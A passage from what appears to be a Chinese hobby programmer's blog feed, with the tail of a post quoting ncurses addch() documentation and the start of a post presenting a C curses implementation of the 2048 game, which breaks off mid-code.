rel="noopener">https://www.jianshu.com/p/b5d7b7c6b9f7</a><br>&#x4F86;&#x6E90;&#xFF1A;&#x7B80;&#x4E66;<br>&#x7B80;&#x4E66;&#x8457;&#x4F5C;&#x6743;&#x5F52;&#x4F5C;&#x8005;&#x6240;&#x6709;&#xFF0C;&#x4EFB;&#x4F55;&#x5F62;&#x5F0F;&#x7684;&#x8F6C;&#x8F7D;&#x90FD;&#x8BF7;&#x8054;&#x7CFB;&#x4F5C;&#x8005;&#x83B7;&#x5F97;&#x6388;&#x6743;&#x5E76;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#x3002;</p><ul><li>addch(), echochar(), mvaddch(), mvwaddch(), waddch(), wechochar()</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SYNOPSIS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;curses.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addch</span><span class="params">(chtype ch)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">waddch</span><span class="params">(WINDOW *win, chtype ch)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mvaddch</span><span class="params">(<span class="keyword">int</span> y, <span class="keyword">int</span> x, chtype ch)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mvwaddch</span><span class="params">(WINDOW *win, <span class="keyword">int</span> y, <span class="keyword">int</span> x, chtype ch)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">echochar</span><span class="params">(chtype ch)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wechochar</span><span class="params">(WINDOW *win, chtype ch)</span></span>;</span><br></pre></td></tr></tbody></table></figure><blockquote><p>DESCRIPTION<br>The addch(), waddch(), mvaddch() and mvwaddch() routines put the character ch into the given window at its current window position, which is then advanced. They are analogous to putchar() in stdio(). If the advance is at the right margin, the cursor automatically wraps to the beginning of the next line. At the bottom of the current scrolling region, if scrollok() is enabled, the scrolling region is scrolled up one line.</p></blockquote><blockquote><p>If ch is a tab, newline, or backspace, the cursor is moved appropriately within the window. Backspace moves the cursor one character left; at the left edge of a window it does nothing. Newline does a clrtoeol(), then moves the cursor to the window left margin on the next line, scrolling the window if on the last line). Tabs are considered to be at every eighth column.</p></blockquote><blockquote><p>If ch is any control character other than tab, newline, or backspace, it is drawn in ^X notation. Calling winch() after adding a control character does not return the character itself, but instead returns the ^-representation of the control character. (To emit control characters literally, use echochar().)</p></blockquote><blockquote><p>Video attributes can be combined with a character argument passed to addch() or related functions by logical-ORing them into the character. (Thus, text, including attributes, can be copied from one place to another using inch() and addch().). See the curs_attr() page for values of predefined video attribute constants that can be usefully OR&#x2019;ed into characters.</p></blockquote><blockquote><p>The echochar() and wechochar() routines are equivalent to a call to addch() followed by a call to refresh(), or a call to waddch() followed by a call to wrefresh(). The knowledge that only a single character is being output is used and, for non-control characters, a considerable performance gain may be seen by using these routines instead of their equivalents.</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> c++ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>using c++ to realize 2048</title>
      <link href="/2018/09/29/using-c-to-realize-2048/"/>
      <url>/2018/09/29/using-c-to-realize-2048/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/ncn155.jpg" alt=""><br><a id="more"></a></p><p>&#x4ECA;&#x5929;&#xFF0C;&#x5B66;&#x4E60;&#x4E86;&#x600E;&#x4E48;&#x7528;c&#x8BED;&#x8A00;&#x6765;&#x5B9E;&#x73B0;2048&#x8FD9;&#x6837;&#x4E00;&#x4E2A;&#x5C0F;&#x6E38;&#x620F;&#x4E86;&#x3002;&#x867D;&#x7136;&#xFF0C;&#x81EA;&#x5DF1;&#x73B0;&#x5728;&#x8FD8;&#x6CA1;&#x6709;&#x52A8;&#x624B;&#x81EA;&#x5DF1;&#x53BB;&#x5F00;&#x53D1;&#x7684;&#x80FD;&#x529B;&#xFF0C;&#x4F46;&#x662F;&#xFF0C;&#x5F53;&#x81EA;&#x5DF1;&#x7167;&#x7740;&#x88AB;&#x4EBA;&#x7684;&#xFF0C;&#x4EE3;&#x7801;&#x5199;&#x51FA;&#x6765;&#x6E38;&#x620F;&#xFF0C;&#x81EA;&#x5DF1;&#x73A9;&#x7740;&#x8FD8;&#x662F;&#x5F88;&#x5F00;&#x5FC3;&#x7684;&#x3002;&#x6700;&#x5173;&#x952E;&#x7684;&#x662F;&#xFF0C;&#x81EA;&#x5DF1;&#x53EF;&#x4EE5;&#x5728;&#x6E38;&#x620F;&#x4E2D;&#xFF0C;&#x52A0;&#x4E00;&#x4E9B;&#x522B;&#x4EBA;&#x610F;&#x60F3;&#x4E0D;&#x5230;&#x7684;&#x4E1C;&#x897F;^*^<br>&#x4EE3;&#x7801;&#xFF1A;</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;curses.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[<span class="number">4</span>][<span class="number">4</span>] = {<span class="number">0</span>};</span><br><span class="line"><span class="keyword">int</span> empty;</span><br><span class="line"><span class="keyword">int</span> old_y, old_x;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span></span>;    <span class="comment">// &#x7ED8;&#x5236;&#x6E38;&#x620F;&#x754C;&#x9762;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>;    <span class="comment">// &#x521D;&#x59CB;&#x5316;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">draw_one</span><span class="params">(<span class="keyword">int</span> y, <span class="keyword">int</span> x)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cnt_value</span><span class="params">(<span class="keyword">int</span> *new_y, <span class="keyword">int</span> *new_x)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">game_over</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cnt_one</span><span class="params">(<span class="keyword">int</span> y, <span class="keyword">int</span> x)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">endwin</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">init();</span><br><span class="line">play();</span><br><span class="line">endwin();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> x, y;</span><br><span class="line"></span><br><span class="line">    initscr();</span><br><span class="line">    cbreak();</span><br><span class="line">    noecho();</span><br><span class="line">    curs_set(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    empty = <span class="number">15</span>;     <span class="comment">// &#x6807;&#x8BB0;&#x5F53;&#x524D;&#x5B58;&#x5728;&#x7684;&#x7A7A;&#x4F4D;&#x7F6E;&#xFF0C;&#x82E5;&#x4E3A;15&#x5219;&#x6E38;&#x620F;&#x7ED3;&#x675F;</span></span><br><span class="line">    srand(time(<span class="number">0</span>));</span><br><span class="line">    x = rand() % <span class="number">4</span>;     <span class="comment">// rand()&#x51FD;&#x6570;&#x751F;&#x6210;&#x968F;&#x673A;&#x6570;</span></span><br><span class="line">    y = rand() % <span class="number">4</span>;     <span class="comment">// &#x968F;&#x673A;&#x751F;&#x6210;&#x7684;&#x4F4D;&#x7F6E;</span></span><br><span class="line">    a[y][x] = <span class="number">2</span>;        <span class="comment">// &#x5C06;&#x5176;&#x76D8;&#x4E2D;&#x7684;&#x8BE5;&#x4F4D;&#x7F6E;&#x8D4B;&#x503C;</span></span><br><span class="line">    draw();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> n, m, x, y;</span><br><span class="line">    <span class="keyword">char</span> c[<span class="number">4</span>] = {<span class="string">&apos;0&apos;</span>, <span class="string">&apos;0&apos;</span>, <span class="string">&apos;0&apos;</span>, <span class="string">&apos;0&apos;</span>};</span><br><span class="line"></span><br><span class="line">    clear();        </span><br><span class="line">    <span class="keyword">for</span>(n = <span class="number">0</span>; n &lt; <span class="number">9</span>; n += <span class="number">2</span>)       <span class="comment">// &#x7ED8;&#x5236;&#x884C;   </span></span><br><span class="line">        <span class="keyword">for</span>(m = <span class="number">0</span>; m &lt; <span class="number">21</span>; m++) </span><br><span class="line">        {</span><br><span class="line">            move(n, m);</span><br><span class="line">            addch(<span class="string">&apos;-&apos;</span>);</span><br><span class="line">            refresh();</span><br><span class="line">        }</span><br><span class="line">    <span class="keyword">for</span>(m = <span class="number">0</span>; m &lt; <span class="number">22</span>; m += <span class="number">5</span>)      <span class="comment">// &#x7ED8;&#x5236;&#x5217;</span></span><br><span class="line">        <span class="keyword">for</span>(n = <span class="number">1</span>; n &lt; <span class="number">8</span>; n++) </span><br><span class="line">        {</span><br><span class="line">            move(n, m);</span><br><span class="line">            addch(<span class="string">&apos;|&apos;</span>);</span><br><span class="line">            refresh();</span><br><span class="line">        }</span><br><span class="line">    <span class="keyword">for</span>(y = <span class="number">0</span>; y &lt; <span class="number">4</span>; y++)     </span><br><span class="line">        <span class="keyword">for</span>(x = <span class="number">0</span>; x &lt; <span class="number">4</span>; x++) </span><br><span class="line">        {</span><br><span class="line">            draw_one(y, x);</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">draw_one</span><span class="params">(<span class="keyword">int</span> y, <span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> i, m, k, j;</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="keyword">char</span> c[<span class="number">5</span>] = {<span class="number">0x00</span>}; </span><br><span class="line">    num = i = a[y][x];</span><br><span class="line">    m = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &gt; <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        j = i % <span class="number">10</span>;</span><br><span class="line">        c[m++] = j + <span class="string">&apos;0&apos;</span>;</span><br><span class="line">        i = i / <span class="number">10</span>;</span><br><span class="line">    }</span><br><span class="line">    m = <span class="number">0</span>;</span><br><span class="line">    k = (x + <span class="number">1</span>) * <span class="number">5</span> - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(c[m] != <span class="number">0x00</span>)</span><br><span class="line">    {</span><br><span class="line">        move(<span class="number">2</span>*y+<span class="number">1</span>, k);</span><br><span class="line">        addch(c[m++]);      <span class="comment">// &#x5C06;&#x5B57;&#x7B26;&#x6DFB;&#x52A0;&#x5230;&#x76F8;&#x5E94;&#x7684;&#x4F4D;&#x7F6E;</span></span><br><span class="line">        <span class="keyword">if</span> (num == <span class="number">2048</span>) {</span><br><span class="line">            move( <span class="number">15</span>, <span class="number">15</span> ); </span><br><span class="line">            printw( <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;niconiconiconi!!!!&quot;</span> ); </span><br><span class="line">        }</span><br><span class="line">        k--;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> x, y, i, new_x, new_y, temp;</span><br><span class="line">    <span class="keyword">int</span> old_empty, move;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) </span><br><span class="line">    {</span><br><span class="line">        move = <span class="number">0</span>;</span><br><span class="line">        old_empty = empty;</span><br><span class="line">        ch = getch(); </span><br><span class="line">        <span class="keyword">switch</span>(ch) {</span><br><span class="line">            <span class="keyword">case</span> <span class="number">97</span>:    <span class="comment">// &#x5DE6;</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">104</span>:   </span><br><span class="line">            <span class="keyword">case</span> <span class="number">68</span>:    </span><br><span class="line">                <span class="keyword">for</span>(y = <span class="number">0</span>; y &lt; <span class="number">4</span>; y++)      <span class="comment">// &#x904D;&#x5386;&#x6240;&#x6709;&#x7684;&#x4F4D;&#x7F6E;</span></span><br><span class="line">                    <span class="keyword">for</span>(x = <span class="number">0</span>; x &lt; <span class="number">4</span>; ) </span><br><span class="line">                    {</span><br><span class="line">                        <span class="keyword">if</span>(a[y][x] == <span class="number">0</span>)    <span class="comment">// &quot;0 0 2 2&quot; &#x7B2C;&#x4E00;&#x4E2A;&#x548C;&#x7B2C;&#x4E8C;&#x4E2A;&#x6570;&#x5B57;&#x90FD;&#x4E3A;0&#xFF0C; &#x4E0B;&#x6B21;&#x79FB;&#x52A8;&#x7684;&#x65F6;&#x5019;&#x540E;&#x7684;&#x72B6;&#x6001;&quot;4 0 0 0&quot;&quot;</span></span><br><span class="line">                        {                   <span class="comment">// &#x6B64;&#x5904;&#x597D;&#x50CF;&#x5E76;&#x6CA1;&#x6709;&#x89E3;&#x51B3;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x8FD9;&#x4E2A;for&#x5FAA;&#x73AF;&#x6700;&#x540E;&#x53EA;&#x80FD;&#x5F97;&#x5230;&quot;0 0 4 0&quot;&quot;</span></span><br><span class="line">                            x++;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        } </span><br><span class="line">                        <span class="keyword">else</span> </span><br><span class="line">                        {</span><br><span class="line">                            <span class="keyword">for</span>(i = x + <span class="number">1</span>; i &lt; <span class="number">4</span>; i++) </span><br><span class="line">                            {</span><br><span class="line">                                <span class="keyword">if</span>(a[y][i] == <span class="number">0</span>) </span><br><span class="line">                                {</span><br><span class="line">                                    <span class="keyword">continue</span>;</span><br><span class="line">                                }</span><br><span class="line">                                <span class="keyword">else</span> </span><br><span class="line">                                {</span><br><span class="line">                                    <span class="keyword">if</span>(a[y][x] == a[y][i])  <span class="comment">// &#x5982;&#x679C;&#x4E24;&#x4E2A;&#x4F4D;&#x7F6E;&#x7684;&#x6570;&#x5B57;&#x76F8;&#x540C;&#xFF0C; &#x53F3;&#x8FB9;&#x7684;&#x6570;&#x5B57;&#x4E0E;&#x5DE6;&#x8FB9;&#x7684;&#x6570;&#x5B57;&#x5408;&#x5E76;</span></span><br><span class="line">                                    {</span><br><span class="line">                                        a[y][x] += a[y][i];</span><br><span class="line">                                        a[y][i] = <span class="number">0</span>;</span><br><span class="line">                                        empty++;        <span class="comment">// &#x7A7A;&#x683C;&#x7684;&#x6570;&#x91CF;&#x589E;&#x52A0;1</span></span><br><span class="line">                                        <span class="keyword">break</span>;</span><br><span class="line">                                    }</span><br><span class="line">                                    <span class="keyword">else</span> </span><br><span class="line">                                    {</span><br><span class="line">                                        <span class="keyword">break</span>;</span><br><span class="line">                                    }</span><br><span class="line">                                }</span><br><span class="line">                            }</span><br><span class="line">                            x = i;      <span class="comment">// &quot;4 2 2 8&quot; 4 &#x548C; 2 &#x4E0D;&#x76F8;&#x7B49;&#xFF0C;&#x6B64;&#x5904;&#x7684;x = i&#xFF0C;&#x5C31;&#x6709;&#x4E00;&#x79CD;x++&#x7684;&#x610F;&#x601D;&#x3002;</span></span><br><span class="line">                        }</span><br><span class="line">                    }</span><br><span class="line">                <span class="keyword">for</span>(y = <span class="number">0</span>; y &lt; <span class="number">4</span>; y++)      <span class="comment">// &#x8FD9;&#x91CC;&#x80FD;&#x591F;&#x628A;&#x4E0A;&#x9762;&quot;0 0 4 0&quot;,&#x8FD9;&#x79CD;&#x72B6;&#x6001;&#x8F6C;&#x5316;&#x4E3A;&#x2018;4 0 0 0&#x2019;&#x8FD9;&#x79CD;&#x72B6;&#x6001;</span></span><br><span class="line">                    <span class="keyword">for</span>(x = <span class="number">0</span>; x &lt; <span class="number">4</span>; x++) </span><br><span class="line">                    {</span><br><span class="line">                        <span class="keyword">if</span>(a[y][x] == <span class="number">0</span>) </span><br><span class="line">                        {</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        } </span><br><span class="line">                        <span class="keyword">else</span> </span><br><span class="line">                        {</span><br><span class="line">                            <span class="keyword">for</span>(i = x; (i &gt; <span class="number">0</span>) &amp;&amp; (a[y][i<span class="number">-1</span>] == <span class="number">0</span>); i--) </span><br><span class="line">                            {</span><br><span class="line">                                a[y][i<span class="number">-1</span>] = a[y][i];</span><br><span class="line">                                a[y][i] = <span class="number">0</span>;</span><br><span class="line">                                move = <span class="number">1</span>;       <span class="comment">//&#x6B64;&#x5904;&#x7684;move&#x7528;&#x6765;&#x6807;&#x8BB0;&#x65B0;&#x72B6;&#x6001;&#x7684;&#x4EA7;&#x751F;</span></span><br><span class="line">                            }</span><br><span class="line">                        }</span><br><span class="line">                    }</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">100</span>:       <span class="comment">// &#x53F3;</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">108</span>:   </span><br><span class="line">            <span class="keyword">case</span> <span class="number">67</span>:    </span><br><span class="line">                <span class="keyword">for</span>(y = <span class="number">0</span>; y &lt; <span class="number">4</span>; y++)</span><br><span class="line">                    <span class="keyword">for</span>(x = <span class="number">3</span>; x &gt;= <span class="number">0</span>; ) </span><br><span class="line">                    {</span><br><span class="line">                        <span class="keyword">if</span>(a[y][x] == <span class="number">0</span>) </span><br><span class="line">                        {</span><br><span class="line">                            x--;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        } </span><br><span class="line">                        <span class="keyword">else</span> </span><br><span class="line">                        {</span><br><span class="line">                            <span class="keyword">for</span>(i = x - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">                            {</span><br><span class="line">                                <span class="keyword">if</span>(a[y][i] == <span class="number">0</span>)</span><br><span class="line">                                {</span><br><span class="line">                                    <span class="keyword">continue</span>;</span><br><span class="line">                                } </span><br><span class="line">                                <span class="keyword">else</span> <span class="keyword">if</span>(a[y][x] == a[y][i]) </span><br><span class="line">                                {</span><br><span class="line">                                    a[y][x] += a[y][i];</span><br><span class="line">                                    a[y][i] = <span class="number">0</span>;</span><br><span class="line">                                    empty++;</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                } </span><br><span class="line">                                <span class="keyword">else</span> </span><br><span class="line">                                {</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                }</span><br><span class="line">                            }</span><br><span class="line">                            x = i;</span><br><span class="line">                        }</span><br><span class="line">                    }</span><br><span class="line">                <span class="keyword">for</span>(y = <span class="number">0</span>; y &lt; <span class="number">4</span>; y++)</span><br><span class="line">                    <span class="keyword">for</span>(x = <span class="number">3</span>; x &gt;= <span class="number">0</span>; x--) </span><br><span class="line">                    {</span><br><span class="line">                        <span class="keyword">if</span>(a[y][x] == <span 